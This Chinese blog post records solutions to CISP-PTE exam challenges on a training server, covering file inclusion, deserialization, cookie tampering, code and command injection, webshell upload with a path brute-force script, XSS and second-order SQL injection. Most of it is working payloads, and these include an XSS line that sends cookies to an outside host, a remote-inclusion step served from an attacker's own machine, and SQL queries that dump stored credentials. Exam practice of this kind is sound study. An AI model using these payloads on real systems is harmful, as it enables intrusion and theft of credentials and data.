---
title: PTE试题记录
date: 2023-02-02 16:26:22
categories: 渗透测试
tags: 考试
---

对PTE考试的几道题做了一下总结记录。

<!--more-->

#### 1.文件包含 83

本题过滤了一些文件包含的关键字,包括但不限于以下关键字

* php://filter
* php://input
* data://

解决方式，双写绕过

##### 解法一 

`http://150.158.27.164:83/start/index.php?page=datdata://a://text/plain,<?php system('find / -name key.php');?>`

`http://150.158.27.164:83/start/index.php?page=datdata://a://text/plain,<?php system('cat /var/www/html/key.php');?>`

或者使用相对路径

`http://150.158.27.164:83/start/index.php?page=datdata://a://text/plain,<?php system('cat ../key.php');?>`

##### 解法二

远程文件包含

编辑1.txt文件，写入php代码

`<?php system('cat ../key.php');?>`

将txt文件放入远程服务器，开启简单http服务

`python3 -m http.server 80`

由于本题会自动添加后缀txt，所以直接访问1即可

`http://150.158.27.164:83/start/index.php?page=http://152.32.191.36:8050/1`

#### 2.反序列化漏洞-84

```
 <?php
error_reporting(0);
include "key4.php";
$PTE = "CISP-PTE";
$str = $_GET['str'];
if (unserialize($str) === "$PTE")
{
    echo "$key4";
}
show_source(__FILE__); 
```

通过代码看出只要传入的参数反序列化等于CISP-PTE，就会显示key

所以将CISP-PTE序列化后传入即可，注意后面的分号

序列化代码

```php
<?php
$str = "CISP-PTE";
$r= serialize($str);
echo $r;
?>
```

`http://150.158.27.164:84/start/vul.php?str=s:8:'CISP-PTE';`

#### 3.失效的访问控制-85

本题请求包

```http
GET /start/ HTTP/1.1
Host: 150.158.27.164:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=dfs1fcpog8ia4np1ve7n0l0hpd; IsAdmin=false; Username=R3Vlc3Q%3D
Upgrade-Insecure-Requests: 1
```

关键在于cookie

username的值bash64解码为Guest

解题思路将`IsAdmin=False`改为`IsAdmin=true`,将username改为admin即可(注意admin的base64编码)

```http
GET /start/ HTTP/1.1
Host: 150.158.27.164:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=dfs1fcpog8ia4np1ve7n0l0hpd; IsAdmin=true; Username=YWRtaW4=%3D
Upgrade-Insecure-Requests: 1

```

得到key

`key5:m9gbqjr6`

#### 4.文件包含-1083

本题同样过滤了一些文件包含的关键字

解题方法依旧是双写绕过

`http://150.158.27.164:1083/start/index.php?page=phphp://p://filter/read=convert.base64-encode/resource=../key.php`

得到base64编码的`PD9waHANCi8va2V5Mzo0cnB2ZHlzdQ0KPz4NCg== `

解码

```
<?php
//key3:4rpvdysu
?>
```

#### 5.代码执行漏洞-1084

```
 <?php
error_reporting(0);
include "key4.php";
$a=$_GET['a'];
eval("\$o=strtolower(\"$a\");");
echo $o;
show_source(__FILE__); 
```

本题主要考察绕过技巧

`http://150.158.27.164:1084/start/vul.php?a=${${system('cat ./key4.php')}}`

或者

`http://150.158.27.164:1084/start/vul.php?a=");system('id');//`

#### 6.文件上传-2082

本题代码

```php
$filename = $files["name"];
$randnum = rand(1, 99999);
$fullpath = '/' . md5($filename.$randnum).".".substr($filename,strripos($filename,'.') + 1); 
```

代码逻辑就是获取文件名，将文件名与1-99999之间生成的随机数做一个md5运算，再拼接上后缀

一看代码就知道上传没有返回路径，需要爆破路径，用python生成所有可能的文件名，进行爆破

python代码

```python
import  hashlib
filename = "shells.php"
path_list = []
for i in range(1,99999):
    s = hashlib.md5((filename+str(i)).encode())
    path = s.hexdigest()+'.php'
    path_list.append(path)
    
with open('path.txt','a') as f:
    for i in path_list:
        print(i)
        f.write(i+'\n')
```

后台对上传文件的内容做了些检测，过滤了eval()等危险函数，只需大小写绕过，但不限制后缀，将脚本后后写在正常的图片里，上传修改后缀为php即可。

成功之后使用burpsuite爆破shell,或者使用脚本

```python
import requests
import sys
import queue

Queue =queue.Queue()
import threading
def run():
    while not Queue.empty():
        try:
            path = "http://150.xxx.xxx.164:2082/"+Queue.get()
            print("\r剩余 %d " % Queue.qsize(),end='')
            res = requests.get(path,timeout=5)
            if res.status_code == 200:
                print("SUCESS %s " % path)
                sys.exit()
        except:
            pass
        

def run_t(t):
    thread_list=[]
    for i in range(t):
        t = threading.Thread(target=run)
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()


file = sys.argv[1]       
with open(file,'r') as f:
    for i in f:
        Queue.put(i.strip())

run_t(100)
```

#### 7.文件包含-2083

这题较为简单，没有任何过滤

`http://150.158.27.164:2083/start/index.php?page=php://filter/read=convert.base64-encode/resource=../key.php`

####  8.XSS-8084

直接留言插入

`</li></div><ScrIpt>document.location='http://152.32.191.36:8084/cookie.php?cookie='+document.cookie;</ScrIpt>`

服务器起个python3或者nc就能收到cookie

#### 9.命令执行-2085

这题过滤了一些常见的查看文件的命令，如cat、more、tail等。使用通配符绕过

`127.0.0.1 & ca\t ../?ey.?hp`

#### 10.二次注入-81

本题是一道二次注入的题，通过注册时插入payload,在配合留言功能插入的payload进行组合，查看留言时触发二次注入

注册一个正常账号来查看回显：gwk

再注册一个带有paylaod的账号：*/'gwk');-- 

使用*/'gwk');-- 账号发表文章，标题填入如下paylaod，内容随意

`',(select group_concat(DISTINCT TABLE_SCHEMA) from information_schema.columns),/*`

实际插入的sql语句

`insert article1 value('DFA15B62-00A0-9244-44FE-B3FC18835084','',(select group_concat(DISTINCT TABLE_SCHEMA) from information_schema.columns),/*','1234','*/'gwk');-- ')`

随后登陆gwk账号查看文章

查询到存在如下库

* ### 2web

* ### information_schema

查表

`',(select group_concat(table_name) from information_schema.tables where table_schema="2web"),/* `

存在如下表

* ### article

* ### article1

* ### users1

查字段

`',(select group_concat(column_name) from information_schema.columns where table_name="article1"),/*`

存在如下字段

​	`content,id,title,username`

查内容

`',(select group_concat(`content`) from (select * from article1 limit 0,5) as temp),/*`

查询到如下内容

`adminkey1:u9y8tr4n,username,password,adminkey1:u9y8tr4n,2432d16509f6eaca1022bd8f28d6bc582cae,zxca698d51a19d8a121ce581499d7b701668,admin' or  ''='202cb962ac59075b964b07152d234b70,kk202cb962ac59075b964b07152d234b70,adminkey1:u9y8tr4n,2432d16509f6eaca1022bd8f28d6bc582cae,zxca698d51a19d8a121ce581499d7b701668,admin' or  ''='202cb962ac59075b964b07152d234b70,kk202cb962ac59075b964b07152d234b70,1`
